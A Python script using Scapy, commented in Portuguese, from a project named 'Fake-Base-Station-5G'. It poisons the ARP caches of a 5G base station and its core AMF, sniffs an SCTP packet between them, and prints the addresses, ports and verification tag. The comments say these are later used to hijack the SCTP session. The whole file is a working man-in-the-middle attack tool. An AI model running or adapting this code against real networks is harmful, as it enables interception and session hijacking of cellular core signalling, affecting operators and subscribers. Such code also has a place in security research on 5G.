#Projeto Fake-Base-Station-5G
#Criado por Roger W. Coêlho
#Código ARP Spoofing SCTP
#Código para a captura da Verification Tag, Destination Port, Source Port
#Posteriormente usado para sequestro de sessão SCTP

from scapy.all import ARP, send, getmacbyip, sniff
import sys
from scapy.layers.sctp import SCTP
from scapy.layers.inet import IP


#Função Arp Spoofing
def spoofing(target1, target2, target1MAC):
    arp_reply = ARP(pdst=target1, hwdst=target1MAC, psrc=target2, op=2)
    send(arp_reply, verbose=0)


#Função de parada do Arp Spoofing
def stop_spoofing(target1, target2, target1MAC, target2MAC):
    arp_reply = ARP(pdst=target1, hwdst=target1MAC, psrc=target2, hwsrc=target2MAC, op=2)
    send(arp_reply, verbose=0, count=4)
    

#Função Sniff SCTP
def spoofing_sctp(pkt):
    
    ip_src=pkt[IP].src
    ip_dst=pkt[IP].dst
    sctp_sport=pkt[SCTP].sport
    sctp_dport=pkt[SCTP].dport
    vtag=str(hex(pkt[SCTP].tag))

    print(" IP da ERB: " + str(ip_src) + " SCTP porta Cliente: " + str(sctp_sport))
    print(" IP do Núcleo 5G (AMF): " + str(ip_dst) + " SCTP porta Servidor NGAP: " + str(sctp_dport))
    print("Verification Tag SCTP cliente: " + vtag)    
    

#Função Main
def main():

    try:    

        print("ARP Spoofing SCTP Iniciado!!!")
        
        ip_erb = input("Entre com o endereço IP da ERB: ")
        ip_amf = input("Entre com o endereço IP do Núcleo 5G: ")

        target1 = ip_erb
        target2 = ip_amf
          
        try:
            target1MAC = str(getmacbyip(target1))
            target2MAC = str(getmacbyip(target2))
        
        except OSError:
            print("Certifique-se de digitar os endereços IP corretamente!!!")
            sys.exit(1)


        spoofing(target1, target2, target1MAC)
        spoofing(target2, target1, target2MAC)

        print("[!] Enviando Pacotes ARP Spoofing...")
        print("[!] Recebendo Informações do Pacote SCTP...")
        
        sniff(1, filter="sctp and src host " + target1, prn=spoofing_sctp, store=0)

        stop_spoofing(target1, target2, target1MAC, target2MAC)
        stop_spoofing(target2, target1, target2MAC, target1MAC)
      
    except KeyboardInterrupt:        
        print()
        print("[!] CTRL+C Detectado!!!")

    print("ARP Spoofing SCTP Finalizado!!!")
    

if __name__ == "__main__":
    main()